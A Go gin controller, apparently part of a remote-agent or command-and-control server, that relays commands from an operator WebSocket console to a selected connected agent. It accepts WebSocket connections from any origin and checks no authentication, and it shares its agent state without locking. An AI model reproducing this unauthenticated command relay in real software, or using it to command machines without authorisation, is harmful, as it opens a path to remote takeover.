package controllers

import (
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var ConsoleClients = make(map[*websocket.Conn]bool)
var ActiveAgentUUID string // <- UUID del agente actualmente seleccionado

var consoleUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// WebSocket para el operador
func WSConsoleHandler(c *gin.Context) {
	ws, err := consoleUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Println("[-] Error al hacer upgrade del operador:", err)
		return
	}
	defer ws.Close()

	ConsoleClients[ws] = true
	// log.Println("[+] Operador conectado a /console")

	for {
		_, cmd, err := ws.ReadMessage()
		if err != nil {
			log.Println("[-] Operador desconectado")
			delete(ConsoleClients, ws)
			break
		}

		// log.Printf("[>] Comando recibido del operador: %s", string(cmd))

		if agent, ok := ConnectedAgents[ActiveAgentUUID]; ok {
			err := agent.Conn.WriteMessage(websocket.TextMessage, cmd)
			if err != nil {
				log.Println("[-] Error al enviar comando al agente:", err)
			}
		} else {
			log.Println("[-] No hay agente activo o el UUID no es válido")
			ws.WriteMessage(websocket.TextMessage, []byte("[!] No hay agente activo. Selecciona uno desde la lista."))
		}
	}
}

func SetActiveAgent(c *gin.Context) {
	var payload struct {
		UUID string `json:"uuid"`
	}
	if err := c.ShouldBindJSON(&payload); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "UUID inválido"})
		return
	}

	if _, ok := ConnectedAgents[payload.UUID]; ok {
		ActiveAgentUUID = payload.UUID
		// log.Printf("[*] Nuevo agente activo: %s\n", ActiveAgentUUID)
		c.JSON(http.StatusOK, gin.H{"message": "Agente activo cambiado"})
	} else {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agente no encontrado"})
	}
}
